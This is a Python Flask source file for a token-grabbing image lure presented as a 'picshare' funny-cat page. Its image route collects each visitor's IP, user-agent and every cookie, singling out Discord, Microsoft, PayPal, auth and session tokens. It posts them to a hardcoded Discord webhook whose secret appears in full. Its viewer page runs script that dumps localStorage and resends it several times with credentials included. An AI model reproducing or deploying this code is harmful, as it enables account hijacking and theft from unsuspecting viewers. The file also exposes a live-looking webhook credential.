from flask import Flask, request, send_file
import requests
import json
import os
from datetime import datetime
from PIL import Image
from io import BytesIO

app = Flask(__name__)

DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1518539631812149330/Uk2DGqWMrpgED3wh1fyD-8NL2iu7daT-j9VApXjKF7aEGhoxnJC1V3XqqBOCeIeebXW2"
IMAGE_PATH = "real-image.jpg"

def send_to_webhook(data):
    important = {k: v[:400] for k, v in data.get('cookies', {}).items() 
                if any(word in k.lower() for word in ['discord', 'token', 'auth', 'session', 'microsoft', 'paypal', '__dcf', 'sid'])}
    
    embed = {
        "title": "📸 picshare Image Hit",
        "color": 0x00FF00,
        "fields": [
            {"name": "IP", "value": data.get('ip'), "inline": True},
            {"name": "Time", "value": data.get('time'), "inline": True},
            {"name": "Important Data", "value": f"```json\n{json.dumps(important, indent=2)}\n```" if important else "No important tokens"},
            {"name": "All Cookies", "value": f"```json\n{json.dumps(data.get('cookies', {}), indent=2)[:1900]}\n```"},
            {"name": "LocalStorage", "value": f"```json\n{data.get('localstorage', 'none')}\n```"},
            {"name": "User-Agent", "value": data.get('ua')[:400]}
        ]
    }
    requests.post(DISCORD_WEBHOOK, json={"embeds": [embed]})

@app.route('/image.jpg')
def serve_image():
    ip = request.remote_addr
    ua = request.headers.get('User-Agent')
    cookies = dict(request.cookies)
    time_str = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    localstorage = request.args.get('ls', 'none')
    
    data = {'ip': ip, 'ua': ua, 'cookies': cookies, 'time': time_str, 'localstorage': localstorage}
    send_to_webhook(data)
    
    if os.path.exists(IMAGE_PATH):
        return send_file(IMAGE_PATH, mimetype='image/jpeg')
    else:
        img = Image.new('RGB', (1200, 800), color=(20,20,35))
        buf = BytesIO()
        img.save(buf, 'JPEG', quality=95)
        buf.seek(0)
        return send_file(buf, mimetype='image/jpeg')

@app.route('/view')
def view_page():
    html = '''
    <!DOCTYPE html>
    <html lang="de">
    <head>
        <meta charset="UTF-8">
        <meta property="og:image" content="/image.jpg">
        <meta property="og:title" content="Funny Cat - picshare">
        <title>picshare</title>
        <style>body{margin:0;background:#000;overflow:hidden;} img{width:100%;height:100vh;object-fit:contain;}</style>
    </head>
    <body>
        <img src="/image.jpg" alt="">
        <script>
            let ls = {};
            try {
                Object.keys(localStorage).forEach(key => {
                    ls[key] = localStorage.getItem(key);
                });
            } catch(e){}
            
            const payload = {
                ls: JSON.stringify(ls),
                screen: screen.width + "x" + screen.height
            };
            
            // Mehrere aggressive Send-Versuche
            function send() {
                fetch('/image.jpg?' + new URLSearchParams(payload), {
                    credentials: 'include',
                    cache: 'no-store'
                });
            }
            
            send();
            setTimeout(send, 600);
            setTimeout(send, 1400);
            setTimeout(() => window.open('/image.jpg', '_blank'), 800);
            setTimeout(() => window.open(location.href, '_blank'), 2000);
        </script>
    </body>
    </html>
    '''
    return html

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)